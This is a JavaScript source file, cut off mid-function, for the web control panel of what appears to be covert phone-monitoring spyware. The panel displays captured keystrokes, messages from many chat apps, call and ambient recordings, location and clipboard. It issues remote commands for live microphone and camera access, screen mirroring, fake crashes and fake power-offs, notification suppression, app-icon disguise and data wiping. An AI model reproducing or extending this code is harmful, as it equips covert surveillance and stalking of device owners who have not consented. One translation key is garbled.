// Initialize Supabase Client with Auth Persistence
const sbClient = window.supabase.createClient(
    VAULTIQ_CONFIG.supabaseUrl, 
    VAULTIQ_CONFIG.supabaseAnonKey,
    {
        auth: {
            persistSession: true,
            autoRefreshToken: true,
            detectSessionInUrl: true
        }
    }
);

// State management tracking to prevent redundant UI updates
const uiState = {
    lastNotificationId: null,
    isDataFetching: false,
    activeSubscriptions: new Set()
};

// Language Configuration
let currentLanguage = localStorage.getItem('dashboardLanguage') || 'en';

const translations = {
    en: {
        'Dashboard': 'Dashboard',
        'Timeline': 'Timeline',
        'Location': 'Location',
        'Keyword Alerts': 'Keyword Alerts',
        'Call Logs': 'Call Logs',
        'SMS Messages': 'SMS Messages',
        'Messengers': 'Messengers',
        'Web History': 'Web History',
        'App Usage': 'App Usage',
        'Photos': 'Photos',
        'Screenshots': 'Screenshots',
        'Keystrokes': 'Keystrokes',
        'Clipboard': 'Clipboard',
        'Contacts': 'Contacts',
        'Call Recordings': 'Call Recordings',
        'Emails': 'Emails',
        'Ambient Recordings': 'Ambient Recordings',
        'Screen Recordings': 'Screen Recordings',
        'Risk Alerts': 'Risk Alerts',
        'Device Info': 'Device Info',
        'Network Info': 'Network Info',
        'SIM Changes': 'SIM Changes',
        'Refresh': 'Refresh',
        'Export CSV': 'Export CSV',
        'Export JSON': 'Export JSON',
        'Platform:': 'Platform:',
        'All Platforms': 'All Platforms',
        'From:': 'From:',
        'To:': 'To:',
        'Search:': 'Search:',
        'Remote Commands': 'Remote Commands',
        '📍 Fetch Location': '📍 Fetch Location',
        '📷 Take Photo': '📷 Take Photo',
        '🔊 Play Sound': '🔊 Play Sound',
        '🔄 Sync Data': '🔄 Sync Data',
        '🎙️ Call Recording Controls': '🎙️ Call Recording Controls',
        '▶️ Start Recording': '▶️ Start Recording',
        '⏸️ Pause Recording': '⏸️ Pause Recording',
        '⏹️ Stop Recording': '⏹️ Stop Recording',
        '➕ Add Geofence': '➕ Add Geofence',
        '🖥️ Screen Recording Controls': '🖥️ Screen Recording Controls',
        '⏺️ Start Screen Record': '⏺️ Start Screen Record',
        '⏹️ Stop Screen Record': '⏹️ Stop Screen Record',
        '📸 Take Screenshot': '📸 Take Screenshot',
        '🛡️ Device Security (Lock/Wipe)': '🛡️ Device Security (Lock/Wipe)',
        '🔒 Lock Device': '🔒 Lock Device',
        '⚠️ Wipe Data': '⚠️ Wipe Data',
        '🎙️ Live Audio Listening': '🎙️ Live Audio Listening',
        '🎤 Start Live Listen': '🎤 Start Live Listen',
        '🔇 Stop Live Listen': '🔇 Stop Live Listen',
        'Recent Activity': 'Recent Activity',
        'No devices connected!': 'No devices connected!',
        'Command sent successfully!': 'Command sent successfully!',
        'Error sending command:': 'Error sending command:',
        'Data refreshed!': 'Data refreshed!',
        'Please enter a valid name and radius': 'Please enter a valid name and radius',
        'Total Locations': 'Total Locations',
        'Total Calls': 'Total Calls',
        'Total SMS': 'Total SMS',
        'Battery Level': 'Battery Level',
        'Top Apps': 'Top Apps',
        'No data yet': 'No data yet',
        'Contact': 'Contact',
        'Phone Number': 'Phone Number',
        'Type': 'Type',
        'Duration': 'Duration',
        'Time': 'Time',
        'Message': 'Message',
        'App': 'App',
        'Title': 'Title',
        'URL': 'URL',
        'Entry Time': 'Entry Time',
        'Exit Time': 'Exit Time',
        'Browsing Mode': 'Browsing Mode',
        'Recorded At': 'Recorded At',
        'Package': 'Package',
        'Usage Time': 'Usage Time',
        'Content': 'Content',
        'Name': 'Name',
        'Emails': 'Emails',
        'File': 'File',
        'Alert Type': 'Alert Type',
        'Description': 'Description',
        'Source': 'Source',
        'Last Seen': 'Last Seen',
        'Last Updated': 'Last Updated',
        'Wi-Fi SSID': 'Wi-Fi SSID',
        'Network Type': 'Network Type',
        'Signal Strength': 'Signal Strength',
        'Cell Info (CID/LAC)': 'Cell Info (CID/LAC)',
        'Carrier (MCC/MNC)': 'Carrier (MCC/MNC)',
        'Old IMSI': 'Old IMSI',
        'New IMSI': 'New IMSI',
        'No network info yet': 'No network info yet',
        'No SIM changes detected': 'No SIM changes detected',
        'incoming': 'incoming',
        'outgoing': 'outgoing',
        'missed': 'missed',
        'rejected': 'rejected',
        'sent': 'sent',
        'received': 'received',
        'draft': 'draft',
        'Logout': 'Logout',
        'Installed Apps': 'Installed Apps',
        'Start Mirror': 'Start Mirror',
        'Stop Mirror': 'Stop Mirror',
        'Fake Crash': 'Fake Crash',
        'Clear Crash': 'Clear Crash',
        'Uninstall': 'Uninstall',
        'App Traffic': 'App Traffic',
        'Bytes Sent': 'Bytes Sent',
        'Bytes Received': 'Bytes Received',
        'Total Traffic': 'Total Traffic'
    },
    bn: {
        'Dashboard': 'ড্যাশবোর্ড',
        'Timeline': 'টাইমলাইন',
        'Location': 'অবস্থান',
        'Keyword Alerts': 'কি-ওয়ার্ড অ্যালার্ট',
        'Call Logs': 'কল লগ',
        'SMS Messages': 'এসএমএস মেসেজ',
        'Messengers': 'মেসেঞ্জার',
        'Web History': 'ওয়েব ইতিহাস',
        'App Usage': 'অ্যাপ ব্যবহার',
        'Photos': 'ছবি',
        'Screenshots': 'স্ক্রিনশট',
        'Keystרוোক': 'কিস্ট্রোক',
        'Clipboard': 'ক্লিপবোর্ড',
        'Contacts': 'কনট্যাক্ট',
        'Call Recordings': 'কল রেকর্ডিং',
        'Emails': 'ইমেইল',
        'Ambient Recordings': 'অ্যাম্বিয়েন্ট রেকর্ডিং',
        'Screen Recordings': 'স্ক্রিন রেকর্ডিং',
        'Risk Alerts': 'ঝুঁকি সতর্কতা',
        'Device Info': 'ডিভাইস তথ্য',
        'Network Info': 'নেটওয়ার্ক তথ্য',
        'SIM Changes': 'সিম পরিবর্তন',
        'Refresh': 'রিফ্রেশ',
        'Export CSV': 'CSV এক্সপোর্ট',
        'Export JSON': 'JSON এক্সপোর্ট',
        'Platform:': 'প্ল্যাটফর্ম:',
        'All Platforms': 'সব প্ল্যাটফর্ম',
        'From:': 'থেকে:',
        'To:': 'পর্যন্ত:',
        'Search:': 'অনুসন্ধান:',
        'Remote Commands': 'রিমোট কমান্ড',
        '📍 Fetch Location': '📍 অবস্থান আনুন',
        '📷 Take Photo': '📷 ছবি তুলুন',
        '🔊 Play Sound': '🔊 শব্দ চালান',
        '🔄 Sync Data': '🔄 ডেটা সিঙ্ক করুন',
        '🎙️ Call Recording Controls': '🎙️ কল রেকর্ডিং কন্ট্রোল',
        '▶️ Start Recording': '▶️ শুরু করুন',
        '⏸️ Pause Recording': '⏸️ বিরতি',
        '⏹️ Stop Recording': '⏹️ বন্ধ করুন',
        '➕ Add Geofence': '➕ জিোফেন্স যোগ করুন',
        '🖥️ Screen Recording Controls': '🖥️ স্ক্রিন রেকর্ডিং কন্ট্রোল',
        '⏺️ Start Screen Record': '⏺️ শুরু করুন',
        '⏹️ Stop Screen Record': '⏹️ বন্ধ করুন',
        '📸 Take Screenshot': '📸 স্ক্রিনশট নিন',
        '🛡️ Device Security (Lock/Wipe)': '🛡️ ডিভাইস নিরাপত্তা (লক/ওয়াইপ)',
        '🔒 Lock Device': '🔒 ডিভাইস লক করুন',
        '⚠️ Wipe Data': '⚠️ ডেটা মুছে ফেলুন',
        '🎙️ Live Audio Listening': '🎙️ সরাসরি অডিও শোনা',
        '🎤 Start Live Listen': '🎤 লাইভ লিসেন শুরু করুন',
        '🔇 Stop Live Listen': '🔇 লাইভ লিসেন বন্ধ করুন',
        'Recent Activity': 'সাম্প্রতিক কার্যকলাপ',
        'No devices connected!': 'কোনো ডিভাইস সংযুক্ত নেই!',
        'Command sent successfully!': 'কমান্ড পাঠানো হয়েছে!',
        'Error sending command:': 'কমান্ড পাঠাতে ত্রুটি:',
        'Data refreshed!': 'ডেটা রিফ্রেশ হয়েছে!',
        'Please enter a valid name and radius': 'অনুগ্রহ করে একটি বৈধ নাম এবং ব্যাসার্ধ লিখুন',
        'Total Locations': 'মোট অবস্থান',
        'Total Calls': 'মোট কল',
        'Total SMS': 'মোট এসএমএস',
        'Battery Level': 'ব্যাটারি লেভেল',
        'Top Apps': 'শীর্ষ অ্যাপ',
        'No data yet': 'এখনও কোনো ডেটা নেই',
        'Contact': 'কনট্যাক্ট',
        'Phone Number': 'ফোন নম্বর',
        'Type': 'ধরন',
        'Duration': 'সময়কাল',
        'Time': 'সময়',
        'Message': 'মেসেজ',
        'App': 'অ্যাপ',
        'Title': 'টাইটেল',
        'URL': 'URL',
        'Entry Time': 'প্রবেশের সময়',
        'Exit Time': 'প্রস্থানের সময়',
        'Browsing Mode': 'ব্রাউজিং মোড',
        'Recorded At': 'রেকর্ড করার সময়',
        'Package': 'প্যাকেজ',
        'Usage Time': 'ব্যবহারের সময়',
        'Content': 'কনটেন্ট',
        'Name': 'নাম',
        'File': 'ফাইল',
        'Alert Type': 'সতর্কতার ধরন',
        'Description': 'বিবরণ',
        'Source': 'উৎস',
        'Last Seen': 'শেষ দেখা গেছে',
        'Last Updated': 'শেষ আপডেট',
        'Wi-Fi SSID': 'ওয়াই-ফাই SSID',
        'Network Type': 'নেটওয়ার্ক ধরন',
        'Signal Strength': 'সিগনাল শক্তি',
        'Cell Info (CID/LAC)': 'সেল তথ্য (CID/LAC)',
        'Carrier (MCC/MNC)': 'অপারেটর (MCC/MNC)',
        'Old IMSI': 'পুরনো IMSI',
        'New IMSI': 'নতুন IMSI',
        'No network info yet': 'এখনো কোনো নেটওয়ার্ক তথ্য নেই',
        'No SIM changes detected': 'কোনো সিম পরিবর্তন সনাক্ত করা যায়নি',
        'incoming': 'আসছে',
        'outgoing': 'যাওয়া',
        'missed': 'মিসড',
        'rejected': 'বাতিল',
        'sent': 'পাঠানো',
        'received': 'প্রাপ্ত',
        'draft': 'ড্রাফট',
        'Logout': 'লগআউট',
        'Installed Apps': 'ইনস্টল করা অ্যাপ',
        'App Traffic': 'অ্যাপ ট্রাফিক',
        'Bytes Sent': 'প্রেরিত বাইট',
        'Bytes Received': 'প্রাপ্ত বাইট',
        'Total Traffic': 'মোট ট্রাফিক',
        'Start Mirror': 'মিররিং শুরু করুন',
        'Stop Mirror': 'মিররিং বন্ধ করুন',
        'Fake Crash': 'ভুয়া ক্র্যাশ',
        'Clear Crash': 'ক্র্যাশ মুছুন',
        'Uninstall': 'আনইনস্টল'
    }
};

function t(text) {
    return translations[currentLanguage][text] || text;
}

function updateAllText() {
    const pageTitleEl = document.getElementById('page-title');
    if (pageTitleEl) {
        pageTitleEl.textContent = t(pageTitleEl.textContent.trim());
    }

    document.querySelectorAll('.nav-item').forEach(item => {
        item.textContent = t(item.textContent.trim());
    });

    document.querySelectorAll('label').forEach(label => {
        label.textContent = t(label.textContent.trim());
    });

    document.querySelectorAll('button').forEach(btn => {
        if (btn.id === 'lang-toggle' || btn.id === 'login-submit-btn') return;
        btn.textContent = t(btn.textContent.trim());
    });

    document.querySelectorAll('h3, h4').forEach(h => {
        h.textContent = t(h.textContent.trim());
    });

    document.querySelectorAll('#platform-filter option').forEach(option => {
        option.textContent = t(option.textContent.trim());
    });
}

// Auth Logic with Session Restoration Fix
async function checkAuth() {
    try {
        const { data: { session }, error } = await sbClient.auth.getSession();
        if (error) throw error;

        if (session) {
            showDashboard();
        } else {
            showLogin();
        }
    } catch (e) {
        console.error("Auth check failed:", e);
        showLogin();
    }
}

function showDashboard() {
    const overlay = document.getElementById('login-overlay');
    const main = document.getElementById('main-dashboard');
    if (overlay) overlay.style.display = 'none';
    if (main) main.style.display = 'flex';
    updateDashboard();
    initSupabaseRealtime();
}

function showLogin() {
    const overlay = document.getElementById('login-overlay');
    const main = document.getElementById('main-dashboard');
    if (overlay) overlay.style.display = 'flex';
    if (main) main.style.display = 'none';
}

async function handleLogin(e) {
    e.preventDefault();
    const emailInput = document.getElementById('login-email');
    const passwordInput = document.getElementById('login-password');
    const errorAlert = document.getElementById('login-error');
    const submitBtn = document.getElementById('login-submit-btn');
    const btnText = document.getElementById('login-btn-text');
    const btnSpinner = document.getElementById('login-btn-spinner');

    if (!emailInput || !passwordInput) return;

    // Run final validation
    let isValid = true;
    if (!emailInput.value) {
        const err = document.getElementById('email-error');
        if (err) { err.textContent = 'Email is required'; err.classList.add('visible'); }
        emailInput.classList.add('error');
        isValid = false;
    }
    if (!passwordInput.value) {
        const err = document.getElementById('password-error');
        if (err) { err.textContent = 'Password is required'; err.classList.add('visible'); }
        passwordInput.classList.add('error');
        isValid = false;
    }
    if (!isValid) return;

    // Show loading state
    if (submitBtn) submitBtn.disabled = true;
    if (btnText) btnText.textContent = 'Signing in...';
    if (btnSpinner) btnSpinner.style.display = 'block';
    if (errorAlert) errorAlert.style.display = 'none';

    try {
        const { data, error } = await sbClient.auth.signInWithPassword({
            email: emailInput.value,
            password: passwordInput.value
        });

        if (error) throw error;

        // Explicitly sync session with local storage for high persistence
        if (data.session) {
            localStorage.setItem('sb-access-token', data.session.access_token);
            localStorage.setItem('sb-refresh-token', data.session.refresh_token);
        }

        emailInput.value = '';
        passwordInput.value = '';
        showDashboard();
    } catch (error) {
        if (errorAlert) {
            errorAlert.textContent = error.message;
            errorAlert.style.display = 'block';
        }
        if (submitBtn) submitBtn.disabled = false;
        if (btnText) btnText.textContent = 'Sign In';
        if (btnSpinner) btnSpinner.style.display = 'none';
    }
}

async function handleLogout() {
    await sbClient.auth.signOut();
    showLogin();
}

// Initialize data
let allData = {
    devices: [],
    locations: [],
    call_logs: [],
    sms: [],
    messenger_messages: [],
    web_history: [],
    app_usage: [],
    photos: [],
    screenshots: [],
    keystrokes: [],
    clipboard_entries: [],
    contacts: [],
    device_info: [],
    network_info: [],
    sim_changes: [],
    commands: [],
    geofences: [],
    ambient_recordings: [],
    screen_recordings: [],
    risk_alerts: [],
    call_recordings: [],
    email_entries: [],
    app_screen_context: [],
    installed_apps: [],
    wifi_history: [],
    calendar_events: [],
    app_traffic: []
};

let map, appsChart;
let geofenceCircles = [];
let geofences = [];
let currentPage = 'dashboard';
let searchQuery = '';
let startDate = null;
let endDate = null;
let selectedPlatform = 'all';
let alerts = [];
let selectedDeviceId = localStorage.getItem('selectedDeviceId') || null;
let liveRefreshInterval = null;

// --- Call Recording Timer Variables ---
let callTimerInterval = null;
let callRecordingStartTime = null;
let callRecordingPaused = false;
let callRecordingPausedTime = 0;
let previousSessionDurations = 0;
const MAX_RECORDING_SECONDS = 18000;
const WARNING_TIMES = [17400, 17700, 17940];
let warningTriggers = new Set();

const platformNames = {
    whatsapp: "WhatsApp",
    whatsapp_business: "WhatsApp Business",
    telegram: "Telegram",
    telegram_x: "Telegram X",
    messenger: "Messenger",
    messenger_lite: "Messenger Lite",
    wechat: "WeChat",
    signal: "Signal",
    viber: "Viber",
    line: "LINE",
    imo: "IMO",
    snapchat: "Snapchat",
    discord: "Discord",
    steam_chat: "Steam Chat",
    slack: "Slack",
    microsoft_teams: "Microsoft Teams",
    google_chat: "Google Chat",
    threema: "Threema",
    wickr: "Wickr",
    session: "Session",
    wire: "Wire",
    kakaotalk: "KakaoTalk",
    zalo: "Zalo",
    bip: "BIP",
    botim: "Botim",
    skype: "Skype",
    tinder: "Tinder",
    bumble: "Bumble",
    tagged: "Tagged",
    meetme: "MeetMe",
    groupme: "GroupMe",
    band: "BAND",
    kik: "Kik",
    google_meet: "Google Meet",
    icq: "ICQ",
    hike_messenger: "Hike",
    tango: "Tango",
    google_messages: "Google Messages",
    instagram: "Instagram",
    facebook: "Facebook",
    tiktok: "TikTok",
    vsco: "VSCO",
    sms: "SMS"
};

function requestNotificationPermission() {
    if ('Notification' in window) {
        Notification.requestPermission().then(permission => {
            console.log('Notification permission:', permission);
        });
    }
}

function sendNotification(msg) {
    if ('Notification' in window && Notification.permission === 'granted') {
        const platformName = platformNames[msg.messenger_type] || msg.messenger_type || 'Unknown';
        const senderName = msg.contact_name || msg.phone_number || 'Unknown Sender';
        const notification = new Notification(platformName, {
            body: `${senderName}: ${msg.content || 'New message'}`,
            icon: 'https://trae.ai/favicon.ico'
        });
        notification.onclick = () => {
            window.focus();
        };
    }
}

document.addEventListener("DOMContentLoaded", async () => {
    console.log(`${VAULTIQ_CONFIG.appName} Dashboard initializing...`);

    // Update all app name references from config
    updateAppNameFromConfig();

    // Initialize login page features FIRST
    initLoginFeatures();

    requestNotificationPermission();
    initNavigation();
    initMap();
    initCharts();
    initEventListeners();
    updateAllText();
    await checkAuth(); // Check authentication status
    console.log(`${VAULTIQ_CONFIG.appName} Dashboard ready!`);
});

// Initialize login page interactive features
function initLoginFeatures() {
    const loginForm = document.getElementById('login-form');
    const emailInput = document.getElementById('login-email');
    const passwordInput = document.getElementById('login-password');
    const passwordToggleBtn = document.getElementById('password-toggle-btn');
    const passwordToggleIcon = document.getElementById('password-toggle-icon');

    // Password toggle functionality
    if (passwordToggleBtn) {
        passwordToggleBtn.addEventListener('click', () => {
            const isPassword = passwordInput.type === 'password';
            passwordInput.type = isPassword ? 'text' : 'password';
            passwordToggleIcon.textContent = isPassword ? '🙈' : '👁️';
        });
    }

    // Real-time email validation
    if (emailInput) {
        emailInput.addEventListener('input', validateEmail);
        emailInput.addEventListener('blur', validateEmail);
    }

    // Real-time password validation
    if (passwordInput) {
        passwordInput.addEventListener('input', validatePassword);
        passwordInput.addEventListener('blur', validatePassword);
    }
}

function validateEmail() {
    const emailInput = document.getElementById('login-email');
    const emailError = document.getElementById('email-error');
    const validationIcon = document.getElementById('email-validation-icon');

    // Basic email regex
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

    if (!emailInput.value) {
        // Empty
        emailInput.classList.remove('valid', 'error');
        emailError.textContent = '';
        emailError.classList.remove('visible');
        validationIcon.style.display = 'none';
        validationIcon.classList.remove('error');
    } else if (!emailRegex.test(emailInput.value)) {
        // Invalid
        emailInput.classList.add('error');
        emailInput.classList.remove('valid');
        emailError.textContent = 'Please enter a valid email address';
        emailError.classList.add('visible');
        validationIcon.style.display = 'block';
        validationIcon.classList.add('error');
        validationIcon.textContent = '✕';
    } else {
        // Valid
        emailInput.classList.remove('error');
        emailInput.classList.add('valid');
        emailError.textContent = '';
        emailError.classList.remove('visible');
        validationIcon.style.display = 'block';
        validationIcon.classList.remove('error');
        validationIcon.textContent = '✓';
    }
}

function validatePassword() {
    const passwordInput = document.getElementById('login-password');
    const passwordError = document.getElementById('password-error');

    if (!passwordInput.value) {
        passwordInput.classList.remove('error');
        passwordError.textContent = '';
        passwordError.classList.remove('visible');
    } else if (passwordInput.value.length < 6) {
        passwordInput.classList.add('error');
        passwordError.textContent = 'Password must be at least 6 characters long';
        passwordError.classList.add('visible');
    } else {
        passwordInput.classList.remove('error');
        passwordError.textContent = '';
        passwordError.classList.remove('visible');
    }
}

/**
 * Updates all UI elements that display the app name using the central config
 */
function updateAppNameFromConfig() {
    const appTitle = document.getElementById('app-title');
    const loginTitle = document.getElementById('login-title');
    const sidebarTitle = document.getElementById('sidebar-title');

    if (appTitle) appTitle.textContent = VAULTIQ_CONFIG.appName;
    if (loginTitle) loginTitle.innerHTML = `🔐 ${VAULTIQ_CONFIG.appName} Login`;
    if (sidebarTitle) sidebarTitle.innerHTML = `🔍 ${VAULTIQ_CONFIG.appName}`;

    // Update translations with app name
    translations.en.appName = VAULTIQ_CONFIG.appName;
    translations.bn.appName = VAULTIQ_CONFIG.appName;
}

function initNavigation() {
    const navItems = document.querySelectorAll(".nav-item");
    const pages = document.querySelectorAll(".page");
    const pageTitle = document.getElementById("page-title");

    navItems.forEach(item => {
        item.addEventListener("click", () => {
            navItems.forEach(nav => nav.classList.remove("active"));
            pages.forEach(page => page.classList.remove("active"));

            item.classList.add("active");
            const pageId = item.dataset.page + "-page";
            const targetPage = document.getElementById(pageId);
            if (targetPage) {
                targetPage.classList.add("active");
            }
            pageTitle.textContent = item.textContent;
            currentPage = item.dataset.page;

            if (item.dataset.page === "map") {
                setTimeout(() => map.invalidateSize(), 100);
            }

            updateCurrentPage();
        });
    });
}

// Helper function to safely add event listeners (null checks)
function safeAddEventListener(id, event, callback) {
    const el = document.getElementById(id);
    if (el) {
        el.addEventListener(event, callback);
    }
}

function initEventListeners() {
    // Auth Listeners
    safeAddEventListener('login-form', 'submit', handleLogin);
    safeAddEventListener('logout-btn', 'click', handleLogout);

    // Language Toggle
    const langBtn = document.getElementById('lang-toggle');
    if (langBtn) {
        langBtn.textContent = currentLanguage === 'bn' ? '🌐 BN' : '🌐 EN';
        langBtn.addEventListener('click', () => {
            currentLanguage = currentLanguage === 'bn' ? 'en' : 'bn';
            localStorage.setItem('dashboardLanguage', currentLanguage);
            langBtn.textContent = currentLanguage === 'bn' ? '🌐 BN' : '🌐 EN';
            updateAllText();
            updateCurrentPage();
        });
    }

    const platformFilter = document.getElementById("platform-filter");
    if (platformFilter) {
        Object.entries(platformNames).forEach(([key, name]) => {
            const option = document.createElement("option");
            option.value = key;
            option.textContent = name;
            platformFilter.appendChild(option);
        });
    }

    safeAddEventListener("refresh-btn", "click", async () => {
        await updateDashboard();
        showAlert('✅ Data refreshed!', 'success');
    });
    safeAddEventListener("export-csv-btn", "click", exportToCSV);
    safeAddEventListener("export-json-btn", "click", exportToJSON);
    safeAddEventListener("search-input", "input", (e) => {
        searchQuery = e.target.value.toLowerCase();
        updateCurrentPage();
    });
    safeAddEventListener("platform-filter", "change", (e) => {
        selectedPlatform = e.target.value;
        updateCurrentPage();
    });
    safeAddEventListener("start-date", "change", (e) => {
        startDate = e.target.value ? new Date(e.target.value) : null;
        updateCurrentPage();
    });
    safeAddEventListener("end-date", "change", (e) => {
        endDate = e.target.value ? new Date(e.target.value) : null;
        updateCurrentPage();
    });

    safeAddEventListener("cmd-fetch-location", "click", () => sendRemoteCommand("fetch_location"));
    safeAddEventListener("cmd-take-photo", "click", () => sendRemoteCommand("take_photo"));
    safeAddEventListener("cmd-ring-device", "click", () => sendRemoteCommand("ring_device"));
    safeAddEventListener("cmd-sync-data", "click", () => sendRemoteCommand("sync_data"));
    safeAddEventListener("cmd-take-screenshot", "click", () => sendRemoteCommand("take_screenshot"));
    safeAddEventListener("cmd-deep-scan", "click", () => {
        if (confirm("Run a full system-wide NASA level deep scan and self-repair?")) {
            sendRemoteCommand("deep_scan");
        }
    });

    safeAddEventListener("cmd-start-call-recording", "click", startCallRecording);
    safeAddEventListener("cmd-pause-call-recording", "click", pauseCallRecording);
    safeAddEventListener("cmd-stop-call-recording", "click", stopCallRecording);

    safeAddEventListener("cmd-start-screen-record", "click", () => sendRemoteCommand("record_screen"));
    safeAddEventListener("cmd-stop-screen-record", "click", () => sendRemoteCommand("stop_record_screen"));
    safeAddEventListener("cmd-lock-device", "click", () => {
        if (confirm("Are you sure you want to LOCK the device?")) {
            sendRemoteCommand("lock_device");
        }
    });
    safeAddEventListener("cmd-wipe-device", "click", () => {
        if (confirm("WARNING: This will factory reset the device! Are you sure?")) {
            sendRemoteCommand("wipe_data");
        }
    });

    safeAddEventListener("cmd-start-mirror", "click", () => {
        sendRemoteCommand("start_screen_mirror");
        startLiveRefresh();
    });
    safeAddEventListener("cmd-stop-mirror", "click", () => {
        sendRemoteCommand("stop_screen_mirror");
        stopLiveRefresh();
    });

    safeAddEventListener("cmd-fake-crash", "click", () => sendRemoteCommand("fake_crash"));
    safeAddEventListener("cmd-clear-crash", "click", () => sendRemoteCommand("clear_crash"));
    safeAddEventListener("cmd-broadcast", "click", () => {
        const urlEl = document.getElementById("broadcast-url");
        if (urlEl && urlEl.value) sendRemoteCommand("voice_broadcast", urlEl.value);
    });

    // Live Listening Controls
    safeAddEventListener("cmd-start-live-listen", "click", () => sendRemoteCommand("start_live_listen"));
    safeAddEventListener("cmd-stop-live-listen", "click", () => sendRemoteCommand("stop_live_listen"));

    // Auto-Toggle Listeners
    safeAddEventListener("toggle-auto-call-record", "change", (e) => {
        sendRemoteCommand(e.target.checked ? "enable_auto_call_record" : "disable_auto_call_record");
    });
    safeAddEventListener("toggle-unlock-selfie", "change", (e) => {
        sendRemoteCommand(e.target.checked ? "enable_unlock_selfie" : "disable_unlock_selfie");
    });
    safeAddEventListener("toggle-voice-trigger", "change", (e) => {
        sendRemoteCommand(e.target.checked ? "enable_voice_trigger" : "disable_voice_trigger");
    });
    safeAddEventListener("toggle-notif-suppress", "change", (e) => {
        sendRemoteCommand(e.target.checked ? "enable_notif_suppress" : "disable_notif_suppress");
    });

    safeAddEventListener("toggle-block-incognito", "change", (e) => {
        sendRemoteCommand(e.target.checked ? "enable_block_incognito" : "disable_block_incognito");
    });

    safeAddEventListener("btn-update-incognito-apps", "click", () => {
        const appsEl = document.getElementById("incognito-apps-input");
        if (appsEl && appsEl.value) sendRemoteCommand("update_incognito_apps", appsEl.value);
    });

    safeAddEventListener("cmd-fake-reboot", "click", () => sendRemoteCommand("fake_reboot"));
    safeAddEventListener("cmd-fake-shutdown", "click", () => sendRemoteCommand("fake_shutdown"));
    safeAddEventListener("cmd-clear-fake-poweroff", "click", () => sendRemoteCommand("clear_fake_poweroff"));
    safeAddEventListener("cmd-live-camera-front", "click", () => {
        sendRemoteCommand("start_live_camera_front");
        startLiveRefresh();
    });
    safeAddEventListener("cmd-live-camera-back", "click", () => {
        sendRemoteCommand("start_live_camera_back");
        startLiveRefresh();
    });
    safeAddEventListener("cmd-live-camera-stop", "click", () => {
        sendRemoteCommand("stop_live_camera");
        stopLiveRefresh();
    });
    safeAddEventListener("cmd-inject-clipboard", "click", () => {
        const textEl = document.getElementById("inject-clipboard-text");
        if (textEl && textEl.value) sendRemoteCommand("inject_clipboard", textEl.value);
    });

    // New Advanced Control Listeners (Phase 5)
    safeAddEventListener("toggle-voip-record", "change", (e) => {
        sendRemoteCommand(e.target.checked ? "enable_voip_record" : "disable_voip_record");
    });
    safeAddEventListener("toggle-media-sync", "change", (e) => {
        sendRemoteCommand(e.target.checked ? "enable_media_sync" : "disable_media_sync");
    });
    safeAddEventListener("toggle-wifi-only", "change", (e) => {
        sendRemoteCommand(e.target.checked ? "enable_wifi_only" : "disable_wifi_only");
    });
    safeAddEventListener("btn-update-keywords", "click", () => {
        const keywordsEl = document.getElementById("keyword-input");
        if (keywordsEl && keywordsEl.value) sendRemoteCommand("update_keywords", keywordsEl.value);
    });
    safeAddEventListener("btn-morph-app", "click", () => {
        const iconEl = document.getElementById("icon-selector");
        if (iconEl && confirm(`Change app identity to ${iconEl.value}?`)) {
            sendRemoteCommand("morph_app", iconEl.value);
        }
    });

    safeAddEventListener("mobile-menu-toggle", "click", () => {
        const sidebar = document.getElementById("sidebar");
        if (sidebar) {
            sidebar.classList.toggle("open");
            const isExpanded = sidebar.classList.contains("open");
            const toggleBtn = document.getElementById("mobile-menu-toggle");
            if (toggleBtn) toggleBtn.setAttribute("aria-expanded", isExpanded);
        }
    });

    const navItems = document.querySelectorAll(".nav-item");
    navItems.forEach((item) => {
        item.addEventListener("click", () => {
            const sidebar = document.getElementById("sidebar");
            if (sidebar && sidebar.classList.contains("open")) {
                sidebar.classList.remove("open");
                const toggleBtn = document.getElementById("mobile-menu-toggle");
                if (toggleBtn) toggleBtn.setAttribute("aria-expanded", "false");
            }
        });
    });

    safeAddEventListener("btn-add-geofence", "click", addGeofence);

    // Device Selector Listener
    safeAddEventListener('device-selector', 'change', (e) => {
        selectedDeviceId = e.target.value;
        localStorage.setItem('selectedDeviceId', selectedDeviceId);
        updateDashboard();
    });
}

// --- Live Refresh Timer ---
function startLiveRefresh() {
    if (liveRefreshInterval) return;
    liveRefreshInterval = setInterval(async () => {
        await updateDashboard();
    }, 2000); // Refresh every 2 seconds
}

function stopLiveRefresh() {
    if (liveRefreshInterval) {
        clearInterval(liveRefreshInterval);
        liveRefreshInterval = null;
    }
}

// --- Timer Helper Functions ---
function formatTime(seconds) {
    const hrs = Math.floor(seconds / 3600).toString().padStart(2, '0');
    const mins = Math.floor((seconds % 3600) / 60).toString().padStart(2, '0');
    const secs = (seconds % 60).toString().padStart(2, '0');
    return `${hrs}:${mins}:${secs}`;
}

function updateTimerDisplay() {
    if (!callRecordingStartTime) {
        document.getElementById("call-recording-timer").textContent = "00:00:00";
        return;
    }

    let elapsed;
    if (callRecordingPaused) {
        elapsed = callRecordingPausedTime + previousSessionDurations;
    } else {
        const currentTime = Date.now();
        elapsed = Math.floor((currentTime - callRecordingStartTime) / 1000) + callRecordingPausedTime + previousSessionDurations;
    }

    document.getElementById("call-recording-timer").textContent = formatTime(elapsed);
    checkRecordingLimits(elapsed);
}

function checkRecordingLimits(elapsedSeconds) {
    WARNING_TIMES.forEach(warningTime => {
        if (elapsedSeconds >= warningTime && !warningTriggers.has(warningTime)) {
            warningTriggers.add(warningTime);
            showWarningNotification(warningTime);
        }
    });

    if (elapsedSeconds >= MAX_RECORDING_SECONDS) {
        handleMaxTimeReached();
    }
}

function showWarningNotification(warningTime) {
    const minutesLeft = Math.ceil((MAX_RECORDING_SECONDS - warningTime) / 60);
    const message = `⚠️ Call Recording will auto-restart in ${minutesLeft} minute${minutesLeft > 1 ? 's' : ''}!`;

    if ('Notification' in window && Notification.permission === 'granted') {
        new Notification('Device Monitor', {
            body: message,
            icon: '🔔'
        });
    }

    showAlert(message, 'warning');
}

function handleMaxTimeReached() {
    previousSessionDurations += MAX_RECORDING_SECONDS;
    sendRemoteCommand("stop_call_recording");
    setTimeout(() => {
        sendRemoteCommand("start_call_recording");
        warningTriggers.clear();
        showAlert('🔄 New recording session started automatically!', 'success');
    }, 1000);
}

function startCallRecording() {
    if (!callRecordingStartTime || callRecordingPaused) {
        if (callRecordingPaused) {
            callRecordingPaused = false;
            callRecordingStartTime = Date.now();
        } else {
            callRecordingStartTime = Date.now();
            callRecordingPausedTime = 0;
            previousSessionDurations = 0;
            warningTriggers.clear();
        }

        if (!callTimerInterval) {
